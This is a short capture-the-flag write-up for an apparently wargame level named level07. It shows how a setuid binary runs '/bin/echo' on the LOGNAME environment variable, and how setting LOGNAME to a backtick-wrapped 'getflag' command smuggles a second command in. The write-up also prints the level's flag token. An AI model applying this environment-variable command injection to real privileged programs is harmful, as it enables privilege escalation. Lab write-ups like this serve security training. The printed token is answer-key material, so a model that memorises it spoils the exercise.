# level07 solve

Firstly, at all, when we get logged and trying to see if we got the file we can see we have one file ` level07 `

```
$ ls
> level07
```

That's similar operation as level03. It looks like a binary file so we decide to run it.

```
$ ./level07
> level07
```

We decide to see inside the file.

```
$ cat ./level07
```

And we see some multiple line interesting. But the most curious line was `LOGNAME/bin/echo %s `

```
▒▒[▒LOGNAME/bin/echo %s
```

After some reflexion, we decide to try to see if `LOGNAME` is in machine environment.


```
$ env
> ...
> HOME=/home/user/level08
> SHLVL=4
> LOGNAME=level08
> ...
```

And it is the case, so we decide to redirect LOGNAME on getflag, because we suppose that the executable use a ` execve ` like for execute LOGNAME with the bin ` echo ` . We add ``` \` ``` for print the result of the command.

```
$ export LOGNAME=\`getflag\`
```

Trying again and...

```
$ ./level07
> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

We got it!

> <a href="../flag">flag</a> - <a href="../../level06">previous level</a> - <a href="../../level08">next level</a>
